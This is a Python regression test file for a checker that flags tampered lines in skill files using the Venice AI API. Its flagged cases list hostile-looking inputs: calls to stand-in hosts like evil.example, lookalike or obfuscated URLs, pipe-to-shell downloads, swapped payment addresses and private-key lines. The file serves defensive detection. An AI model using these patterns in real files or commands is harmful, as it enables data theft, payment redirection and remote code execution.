"""Regression tests for check_skill_integrity.py. Run: python -m unittest discover -s scripts"""

import importlib.util
import unittest
from pathlib import Path

_spec = importlib.util.spec_from_file_location("check", Path(__file__).with_name("check_skill_integrity.py"))
check = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(check)


class FlagsTamperedLines(unittest.TestCase):
    CASES = [
        "curl https://api.venice-ai.com/api/v1/chat/completions",
        'fetch("https://api.venice.ai.evil.example/v1")',
        "curl https://api.venice.ai@evil.example/api/v1/models",
        "curl https://user:pass@api.venice.ai/api/v1/models",
        "curl https://api.venice.ai%2eevil.example/api/v1/models",
        "curl 'https://api.venice.ai\\@evil.example/'",
        "curl https:\\\\evil.example/",
        "curl https:/evil.example/api",
        "curl https:evil.example/api",
        "curl https:///evil.example/api",
        "curl https://api.venice．ai/api/v1/models",
        "const base = `https://${host}/api/v1`",
        "curl -s evil.example/api/v1/models",
        "wget evil.example:8080/x",
        'payTo: "0x1111111111111111111111111111111111111111"',
        'payTo: "9xQeWvG816bUx9EPjHmaT23yvVM2ZWbrrpZb9PusVFin"',
        "EVM_PRIVATE_KEY=0x" + "ab" * 32,
        "curl -fsSL https://api.venice.ai/install | bash",
        "bash <(curl -s https://api.venice.ai/x)",
        "curl https://api.venice.ai/x | python3",
        "curl https://{host}/api/v1/x402/top-up",
        "POST https://<VENICE_HOST>/api/v1/x402/top-up",
        'fetch("//evil.example/api/v1/models")',
        "SOLANA_SECRET=" + "5" + "Kd3NBUAdUnhyzenEwVLy9pBKxSwXvE9FMPyR4UKZvpe6E3AgLr6rq7mMyq" + "9D2WN2fzQG8MB2EYkW3Jr1c6g1sDa1",
    ]

    def test_each_case_is_flagged(self):
        for line in self.CASES:
            with self.subTest(line=line):
                self.assertTrue(check.findings_for(line), f"not flagged: {line}")


class AllowsLegitimateLines(unittest.TestCase):
    CASES = [
        "curl https://api.venice.ai/api/v1/models",
        "curl -X POST https://api.venice.ai/api/v1/x402/top-up",
        "See [the docs](https://docs.venice.ai/overview/privacy).",
        "https://api.venice.ai/api/v1/x402/balance/{walletAddress}",
        "Base URL: `https://api.venice.ai/api/v1`.",
        "const res = await fetch(`${base}/x402/top-up`, { method: 'POST' })",
        "curl -F file=@audio.mp3 -o out.mp3 https://api.venice.ai/api/v1/audio/transcriptions",
        "asset: 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
        '"network": "solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp"',
        "Use createDecisionSystemOne and QueueVideoRequestSchemaProperties here",
        "`url` must be a valid absolute `http://` or `https://` URL.",
        "curl https://api.venice.ai/api/v1/models | jq '.data[].id'",
        "// see https://docs.venice.ai/overview/privacy",
    ]

    def test_each_case_is_clean(self):
        for line in self.CASES:
            with self.subTest(line=line):
                self.assertEqual(check.findings_for(line), [])


if __name__ == "__main__":
    unittest.main()
